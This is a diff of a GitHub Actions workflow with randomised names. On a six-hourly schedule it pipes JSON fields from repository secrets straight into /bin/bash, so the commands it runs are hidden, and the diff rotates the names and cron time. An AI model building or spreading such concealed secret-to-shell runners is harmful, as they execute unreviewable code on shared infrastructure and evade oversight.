@@ -2,23 +2,27 @@ name: zengshunshen6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 4/6 * * *'
-jobs:  # 77
+    - cron: '43 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: zengshunshen6789
         env:
-          k36: ${{ secrets.k36 }}
+          ghhnr06: ${{ secrets.ghhnr06 }}
         run: |
-          echo $k36 | jq -r .zsx079 | /bin/bash
-          echo $d71 | jq -r .hsnly8 | /bin/bash
-          echo $ta023 | jq -r .uxxu034 | /bin/bash
-          echo $rx01 | jq -r .zzxbr52388 | /bin/bash
-          echo $jetqr3604 | jq -r .j50622 | /bin/bash
-          echo $cdh99606 | jq -r .q104 | /bin/bash
-          echo $ushsv83036 | jq -r .mo4162 | /bin/bash
-          echo $bfkq90 | jq -r .wco0253 | /bin/bash
-          echo $hq42 | jq -r .iqf4434 | /bin/bash
+          echo $ghhnr06 | jq -r .vkkc4 | /bin/bash
+          echo $ubcst0 | jq -r .kvd84569 | /bin/bash
+          echo $iyyn07470 | jq -r .hkmw83811 | /bin/bash
+          echo $voe9 | jq -r .nfdu1 | /bin/bash
+          echo $fg01917 | jq -r .gp2062 | /bin/bash
+          echo $xixh89329 | jq -r .k0 | /bin/bash
+          echo $mr75 | jq -r .dtot561 | /bin/bash
+          echo $wh03 | jq -r .f96 | /bin/bash
+          echo $selcm16347 | jq -r .g09 | /bin/bash
+          echo $wquzg74689 | jq -r .gaivb1 | /bin/bash
+          echo $ncf7 | jq -r .fmv865 | /bin/bash
+          echo $sujzm43 | jq -r .vaf28927 | /bin/bash
 
